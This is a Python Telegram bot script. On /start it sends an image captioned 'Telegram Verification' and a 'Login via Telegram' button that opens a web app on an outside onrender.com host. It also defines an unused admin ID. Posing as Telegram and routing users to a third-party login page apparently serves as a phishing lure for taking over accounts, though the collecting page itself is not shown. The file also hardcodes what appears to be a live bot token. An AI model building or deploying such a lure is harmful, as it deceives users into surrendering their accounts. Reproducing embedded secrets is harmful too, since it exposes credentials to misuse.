from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, WebAppInfo
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes

BOT_TOKEN = '7688238747:AAFyyAnQxrEijQ8Zzo6UZ1oY8CjmgT2DXDs'
WEB_APP_URL = 'https://mybot-k8ng.onrender.com'  # Replace with your deployed Mini App URL

ADMIN_ID = 5452541589  # Replace with your Telegram user ID

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    # First, send the image
    await update.message.reply_photo(
        photo="https://cdn4.cdn-telegram.org/file/IWtBRx9gSRzAP7bwVwkj34lWkgQzzIafQZG1Qe0qtFw3ycEFXMBoEdTZYw9ToMPk7MQCqxRtw4NnRpztczdC_aDztU9vMkFPSH67vf1jDeaA46nxxUZWPZob-bSiSSUAMTqTjItUTnl4MrN9WMr8-YLUKhxLOzmmayeGzxBuc4W0UdrpLL5K8oxlkV09j5PwpMZkrGGOhDNATCbPLcKsOyrLmm-n0xYPkDY-rX_N-Uk9tsDl1iyr9DqMPRy-jZC7uo3OE4BsMoq5SkfmENwxlJjFH4WyVkMlPd6p84Z9k8Fq2kgIs5_M2eYxmO38mKsw_I0z3aBTf1DGQjo2R3XUIA.jpg",  # Replace with your image URL
        caption="👤 Telegram Verification"
    )

    # Then send the welcome message with the login button
    keyboard = [
        [InlineKeyboardButton("🔐 Login via Telegram", web_app=WebAppInfo(url=WEB_APP_URL))]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(
        "👋 Welcome! Click the button below to verify your Telegram account:",
        reply_markup=reply_markup
    )

def main():
    app = ApplicationBuilder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    print("✅ Bot is running...")
    app.run_polling()

if __name__ == "__main__":
    main()
